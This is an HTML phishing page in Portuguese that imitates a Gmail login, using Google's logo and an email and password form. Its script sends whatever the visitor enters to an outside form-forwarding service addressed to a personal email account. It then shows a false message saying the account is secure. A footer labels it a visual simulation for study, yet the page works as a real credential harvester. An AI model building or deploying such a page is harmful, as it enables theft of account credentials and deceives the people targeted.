<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Simulado - Gmail</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #4facfe, #00f2fe);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .form-box, .success-box {
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
      text-align: center;
      display: none;
    }
    .active {
      display: block;
    }
    .logo {
      width: 64px;
      margin-bottom: 20px;
    }
    h2 {
      margin-bottom: 20px;
      color: #333;
    }
    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0 20px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #1a73e8;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    .footer {
      font-size: 13px;
      color: #777;
      margin-top: 20px;
    }
    .success-box h2 {
      color: #4CAF50;
      margin-bottom: 20px;
    }
    .success-box p {
      font-size: 16px;
      color: #555;
    }
  </style>
</head>
<body>

  <!-- Tela do formulário -->
  <div class="form-box active" id="formulario">
    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Logo Gmail" class="logo">
    <h2>Login de Teste</h2>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Digite seu e-mail" required />
      <input type="password" name="senha" placeholder="Digite sua senha" required />
      <button type="submit">Enviar</button>
    </form>
    <div class="footer">Simulação visual para estudos.</div>
  </div>

  <!-- Tela de sucesso -->
  <div class="success-box" id="sucesso">
    <h2>Sua conta está segura</h2>
    <p>Nenhuma atividade suspeita foi detectada.<br>Obrigado por verificar suas informações.</p>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const formData = new FormData(this);

      fetch("https://formsubmit.co/natanaelverissimo34@gmail.com", {
        method: "POST",
        body: formData,
        headers: { 'Accept': 'application/json' }
      }).then(response => {
        if (response.ok) {
          document.getElementById("formulario").classList.remove("active");
          document.getElementById("sucesso").classList.add("active");
        } else {
          alert("Erro ao enviar. Tente novamente.");
        }
      }).catch(() => {
        alert("Erro de conexão.");
      });
    });
  </script>

</body>
</html>
